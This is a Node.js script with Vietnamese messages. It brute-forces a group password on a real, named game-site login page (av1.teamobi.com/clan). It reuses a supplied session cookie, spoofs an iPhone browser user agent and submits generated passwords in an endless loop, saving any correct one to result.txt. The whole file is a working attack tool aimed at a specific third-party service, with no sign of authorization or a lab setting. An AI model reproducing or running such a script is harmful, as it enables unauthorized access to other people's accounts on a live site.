// main.js
const axios = require("axios");
const cheerio = require("cheerio");
const fs = require("fs");
const minimist = require("minimist");
const { nextUnique, saveBitmap, getUsedCount } = require("./unique7_bitmap");

const args = minimist(process.argv.slice(2));
const SESSION_ID = args.session;

if (!SESSION_ID) {
  console.error("❌ Vui lòng cung cấp session ID:");
  console.error("   Ví dụ: node main.js --session=pahduuacee2jq0cnneun6fvkq3");
  process.exit(1);
}

const LOGIN_URL = "http://av1.teamobi.com/clan/?act=login";

function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function tryPassword(pass) {
  try {
    const headers = {
      Accept:
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
      "Accept-Encoding": "gzip, deflate",
      "Accept-Language": "en-US,en;q=0.9,vi;q=0.8",
      "Cache-Control": "max-age=0",
      Connection: "keep-alive",
      "Content-Type": "application/x-www-form-urlencoded",
      Cookie: `PHPSESSID=${SESSION_ID}`,
      Host: "av1.teamobi.com",
      Origin: "http://av1.teamobi.com",
      Referer: "http://av1.teamobi.com/clan/?act=login",
      "Upgrade-Insecure-Requests": "1",
      "User-Agent":
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    };

    const body = new URLSearchParams({
      pw2: pass,
      submit: "Đăng nhập",
    });

    const response = await axios.post(LOGIN_URL, body, {
      headers,
      maxRedirects: 0,
      validateStatus: (status) => status < 400,
    });

    const $ = cheerio.load(response.data);
    const err = $("p.err").text().trim();

    const formFound = $("form").filter((i, el) =>
      $(el).text().includes("Mật khẩu hội nhóm")
    );

    if (formFound.length > 0) {
      console.log("🔎 Tìm thấy form chứa 'Mật khẩu hội nhóm'");
    } else {
      console.log("❌ Không thấy form 'Mật khẩu hội nhóm'");
    }

    if (err.includes("Đăng nhập không thành công")) {
      console.log(`❌ Sai: ${pass}`);
      return false;
    } else {
      console.log(`✅ ĐÚNG MẬT KHẨU: ${pass}`);
      fs.appendFileSync("result.txt", `Mật khẩu đúng: ${pass}\n`);
      return true;
    }
  } catch (err) {
    console.error(`⚠️ Lỗi với ${pass}:`, err.message);
    return false;
  }
}

async function bruteForce() {
  let count = 0;
  console.log("🔁 Bắt đầu dò, đã dùng:", getUsedCount());

  while (true) {
    const pass = nextUnique();
    count++;

    console.log(`⏳ Thử [${count}] → ${pass}`);
    const ok = await tryPassword(pass);
    saveBitmap();

    if (ok) {
      console.log(`🎉 Thành công sau ${count} lần thử!`);
      break;
    }

    await delay(1000); // delay 1 giây
  }
}

bruteForce();
